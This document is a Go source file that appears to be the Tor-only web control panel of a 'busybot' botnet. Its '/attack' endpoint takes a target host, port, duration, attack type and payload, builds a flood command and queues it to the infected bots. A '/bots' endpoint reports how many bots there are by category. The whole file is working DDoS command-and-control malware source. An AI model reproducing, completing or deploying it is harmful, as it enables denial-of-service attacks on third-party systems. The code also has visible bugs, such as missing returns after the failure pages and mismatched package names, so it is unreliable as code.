package serve

import (
        "os"
        "fmt"
        "net/http"
        "strings"

        "busybot/core/handler"
        "busybot/core/functions"
)

var botCount int
var botCatagory string

func InitCmds() {
    http.HandleFunc("/", handler)

    http.HandleFunc("/bots", func(w http.ResponseWriter, r *http.Request) {
        if isTor(strings.Split(r.RemoteAddr, ":")[0]) {
            http.ServeFile(w, r, "assets/branding/home_splash.html")
        }
        key := r.URL.Query().Get("key")
        check := store.Db.TryLogin(key)
        if (!check) {
            http.ServeFile(w, r, "assets/branding/login_fail.html")
        }
        m := store.ClientLst.Distribution()
        for k, v := range m {
           fmt.Fprintf(w, "%s: %d", k, v)
        }
    })

    http.HandleFunc("/attack", func(w http.ResponseWriter, r *http.Request) {
        var command string

        if isTor(strings.Split(r.RemoteAddr, ":")[0]) {
            http.ServeFile(w, r, "assets/branding/home_splash.html")
        }

        key     := r.URL.Query().Get("key")
        host    := r.URL.Query().Get("host")
        time    := r.URL.Query().Get("time")
        port    := r.URL.Query().Get("port")
        method  := r.URL.Query().Get("type")
        length  := r.URL.Query().Get("len")
        sport   := r.URL.Query().Get("sport")
        payload := r.URL.Query().Get("payload")

        command = method+" "+host+" "+time+" dport="+port

        if length != "" {
            command += " len="+length
        }
        if sport != "" {
            command += " sport="+sport
        }
        if payload != "" {
            command += " payload="+payload
        }

        check := store.Db.TryLogin(key)
        if (!check) {
            http.ServeFile(w, r, "assets/branding/login_fail.html")
        }
        botCount = store.Db.GetBots(key)
        var admin int
        if store.Db.IsAdmin(key) {
            admin = 1
        } else {
            admin = 0
        }
        atk, err := handle.NewAttack(command, admin)
        if err != nil {
            http.ServeFile(w, r, "assets/branding/attack_failed.html")
        } else {
            buf, err := atk.Build()
            if err != nil {
                fmt.Fprintf(w, "%s", err.Error())
            } else {
                if can := store.Db.CanLaunchAttack(key, atk.Duration, command, botCount, 0); !can {
                    http.ServeFile(w, r, "assets/branding/attack_else.html")
                } else {
                    store.ClientLst.QueueBuf(buf, botCount, botCatagory)
                    file, err := os.OpenFile("assets/logs/attack.log", os.O_CREATE|os.O_WRONLY, 0644)
                    if err != nil {
                        fmt.Println(err)
		    }

		    defer file.Close()
		    _, err = file.WriteString("Key: "+key+" | Command: "+command+"\n")
		    if err != nil {
		        fmt.Println(err)
		    }
                    http.ServeFile(w, r, "assets/branding/attack_sent.html")
                }
            }
        }
    })
}

func handler(w http.ResponseWriter, r *http.Request) {
    if isTor(strings.Split(r.RemoteAddr, ":")[0]) {
        http.ServeFile(w, r, "assets/branding/home_splash.html")
    }

    http.ServeFile(w, r, "assets/branding/tor_error.html")
    return
}
